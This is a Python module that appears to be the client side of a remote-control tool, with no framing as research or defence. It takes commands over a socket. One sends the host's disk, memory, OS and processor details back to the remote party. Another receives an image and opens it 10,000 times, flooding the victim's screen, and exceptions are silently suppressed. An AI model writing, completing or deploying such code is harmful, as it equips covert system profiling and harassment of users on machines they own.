import socket
from json import loads
from numpy import array, uint8
from time import sleep
from platform import machine, version, platform, processor
from platform import system as sys_info
from psutil import disk_usage, virtual_memory
from PIL import Image


def hd_alert(conn: socket.socket) -> None:
    import cv2
    data = ""
    try:
        while True:
            rc_data = conn.recv(40000).decode()
            if "END" in rc_data[-3:]:
                data += rc_data[:-3]
                break
            data += rc_data
        cv_img = array(loads(data)).astype(uint8)
        img = Image.fromarray(cv_img)
        for _ in range(10000):
            img.show()
    except Exception:
        return


def send_info(conn: socket.socket) -> None:
    if "windows" in sys_info():
        root_path = r"C:\\"
    else:
        root_path = "/"
    conn.sendall(
        f"{disk_usage(root_path)}|{virtual_memory()}|{machine()}|{version()}|{platform()}|{processor()}".encode()
    )


def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
    while True:
        sleep(0.25)
        try:
            if command == "HDalert":
                hd_alert(conn)
                conn.send(b"END")
                break
            elif command == "Sinfo":
                send_info(conn)
                conn.send(b"END")
                break
            else:
                break
        except Exception:
            break